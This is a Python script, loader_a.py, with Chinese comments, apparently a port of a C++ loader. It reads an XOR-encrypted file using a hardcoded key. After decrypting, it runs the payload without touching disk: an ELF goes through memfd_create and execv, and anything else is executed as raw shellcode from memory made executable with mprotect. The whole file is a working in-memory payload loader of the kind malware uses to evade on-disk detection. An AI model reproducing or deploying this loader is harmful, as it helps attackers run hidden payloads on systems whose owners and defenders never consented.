#!/usr/bin/env python3
"""loader_a.py - 对应 loader_a.cpp 的 Python 版
读加密文件 -> 内存异或解密 -> 内存加载执行
密钥必须和 loader_a.cpp / xor_enc.py 一致

用法:
  python3 loader_a.py                        # 默认读 ./a.enc, 不存在回退 ./a
  python3 loader_a.py ./a.enc -p 123         # 后面全透传给 a
  python3 loader_a.py ./a.enc --no-decrypt   # 跳过解密
"""
import ctypes
import mmap
import os
import sys

XOR_KEY = b"Hiject-Xor-Key-2026"

def is_elf(d: bytes) -> bool:
    return len(d) > 4 and d[0] == 0x7F and d[1:4] == b"ELF"

def xor_crypt(d: bytes) -> bytes:
    return bytes(b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(d))

def parse_args(argv):
    path = "./a.enc"
    do_decrypt = True
    pass_args = []
    file_idx = -1
    for i, a in enumerate(argv):
        if a == "--no-decrypt":
            do_decrypt = False
            continue
        if file_idx == -1 and a and not a.startswith("-"):
            path = a
            file_idx = i
            continue
        pass_args.append(a)
    if not argv:
        # 无参默认, a.enc 不存在则回退 a
        if not os.path.exists(path):
            path = "./a"
    return path, do_decrypt, pass_args

def run_elf(data: bytes, path: str, pass_args):
    if not hasattr(os, "memfd_create"):
        print("[-] 需要 Linux + Python3.8+ (os.memfd_create)")
        sys.exit(1)
    mfd = os.memfd_create("py_mem_exec", os.MFD_CLOEXEC)
    off = 0
    while off < len(data):
        off += os.write(mfd, data[off:])
    print(f"[*] 已写入 memfd={mfd}, exec {path} {pass_args}")
    os.execv(f"/proc/self/fd/{mfd}", [path] + pass_args)

def run_shellcode(data: bytes):
    print("[*] 非ELF, 按 shellcode 执行")
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    size = ((len(data) + mmap.PAGESIZE - 1) // mmap.PAGESIZE) * mmap.PAGESIZE
    buf = mmap.mmap(-1, size, prot=mmap.PROT_READ | mmap.PROT_WRITE,
                    flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS)
    buf.write(data)
    addr = ctypes.addressof(ctypes.c_char.from_buffer(buf))
    libc.mprotect(ctypes.c_void_p(addr & ~(mmap.PAGESIZE - 1)), size, 0x1 | 0x4)
    FUNC = ctypes.CFUNCTYPE(None)
    FUNC(addr)()
    print("[+] shellcode 返回")

def main():
    path, do_decrypt, pass_args = parse_args(sys.argv[1:])
    with open(path, "rb") as f:
        data = f.read()
    print(f"[*] 已读取 {path} {len(data)} 字节")

    if do_decrypt:
        if is_elf(data):
            print("[*] 明文ELF, 跳过解密")
        else:
            data = xor_crypt(data)
            print(f"[*] XOR解密完成 ({len(XOR_KEY)}字节密钥)")

    if is_elf(data):
        run_elf(data, path, pass_args)
    else:
        run_shellcode(data)

if __name__ == "__main__":
    main()
